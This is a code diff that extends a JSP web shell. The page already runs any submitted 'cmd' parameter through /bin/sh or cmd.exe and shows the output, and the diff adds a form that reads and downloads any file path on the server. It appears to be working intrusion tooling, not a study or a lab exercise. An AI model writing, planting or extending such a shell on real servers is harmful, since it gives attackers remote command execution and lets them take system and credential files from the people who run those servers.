@@ -1,4 +1,4 @@
-<%@ page import="java.io.BufferedReader,java.io.InputStreamReader" %>
+<%@ page import="java.io.BufferedReader,java.io.File,java.io.FileInputStream,java.io.InputStreamReader" trimDirectiveWhitespaces="true" %>
 <%!
     String htmlEscape(String in) {
         return in.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll("\"", "&quot;").replaceAll("'", "&#039;");
@@ -10,12 +10,30 @@
         response.setStatus(404);
         return;
     }
+    String downloadFile = request.getParameter("download-file");
+    String downloadMsg = "";
+    if(downloadFile != null && !downloadFile.trim().equals("")) {
+        File f = new File(downloadFile);
+        if(f.canRead()) {
+            response.setContentType("application/octet-stream");
+            response.setHeader("Content-Disposition", "attachment; filename=\"" + f.getName() + "\"");
+            FileInputStream fis = new FileInputStream(f);
+            int i;
+            while((i = fis.read()) != -1) {
+                out.write(i);
+            }
+            fis.close();
+            out.close();
+        } else {
+            downloadMsg = "Error accessing file <code>" + htmlEscape(downloadFile) + "</code><br />\n";
+        }
+    }
     String shell = null;
     String shellOpt = null;
-    String cmd = null;
+    String cmd = request.getParameter("cmd");
     Integer exitCode = null;
     StringBuilder stdout = new StringBuilder("");
-    if(request.getMethod().equals("POST") && !request.getParameter("cmd").trim().equals("")) {
+    if(request.getMethod().equals("POST") && cmd != null && !cmd.trim().equals("")) {
         String osName = System.getProperty("os.name").toLowerCase();
         if(osName.contains("windows")) {
             shell = "cmd.exe";
@@ -24,7 +42,6 @@
             shell = "/bin/sh";
             shellOpt = "-c";
         }
-        cmd = request.getParameter("cmd");
         ProcessBuilder pb = new ProcessBuilder(shell, shellOpt, cmd);
         pb.redirectErrorStream(true);
         Process p = pb.start();
@@ -49,7 +66,7 @@
         </form>
         <div style="margin: 3px auto;">
 <%
-    if(cmd != null) {
+    if(shell != null) {
         out.println("Output of command <code>" + htmlEscape(shell) + " " + htmlEscape(shellOpt) + "</code> with argument: <code>" + htmlEscape(cmd) + "</code>");
     } else {
         out.println("Run a command to see its output");
@@ -65,6 +82,16 @@
         out.println("Exit code: <code>" + exitCode + "</code>");
     }
 %>
+        </div>
+        <div style="margin: 1rem auto;">
+            <b>File Download</b>
+            <div>
+<%= downloadMsg %>
+            </div>
+            <form method="POST" action="">
+                <input type="text" name="download-file" placeholder="File to download" />
+                <input type="submit" name="submit-download" value="Download" />
+            </form>
         </div>
     </body>
 </html>
